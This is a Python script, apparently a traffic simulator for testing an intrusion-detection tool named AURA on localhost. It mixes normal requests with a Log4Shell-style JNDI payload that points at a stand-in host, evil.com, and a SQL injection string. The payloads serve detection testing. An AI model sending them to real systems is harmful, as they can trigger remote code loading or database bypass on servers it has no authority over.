import requests
import time
import random
import sys

# Target URL (Where AURA is listening/monitoring)
TARGET_URL = "http://localhost:8080/api/v1/login"

def normal_traffic():
    print("[*] Sending NORMAL traffic...")
    try:
        requests.get(TARGET_URL, params={"user": "admin"}, timeout=2)
    except Exception as e:
        print(f"[-] Connection error: {e}")

def attack_traffic_cve_2025():
    # Simulating a payload found in a recent OSINT feed
    print("[!] Sending ATTACK traffic (CVE-2025-PoC)...")
    # This payload should match something in your intelligence_feed.json
    # If using Gemini embeddings, even a variant should trigger it.
    payload = "${jndi:ldap://evil.com/exploit}" 
    headers = {"User-Agent": payload}
    try:
        requests.get(TARGET_URL, headers=headers, timeout=2)
    except Exception as e:
        print(f"[-] Connection error: {e}")

def attack_traffic_sql_injection():
    print("[!] Sending SQL Injection traffic...")
    payload = "' OR 1=1 --"
    try:
        requests.get(TARGET_URL, params={"id": payload}, timeout=2)
    except Exception as e:
        print(f"[-] Connection error: {e}")

if __name__ == "__main__":
    print(f"[*] Attacker Simulator targeting {TARGET_URL}")
    print("Press Ctrl+C to stop.")
    try:
        while True:
            r = random.random()
            if r < 0.6:
                normal_traffic()
            elif r < 0.8:
                attack_traffic_cve_2025()
            else:
                attack_traffic_sql_injection()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Stopping simulator.")
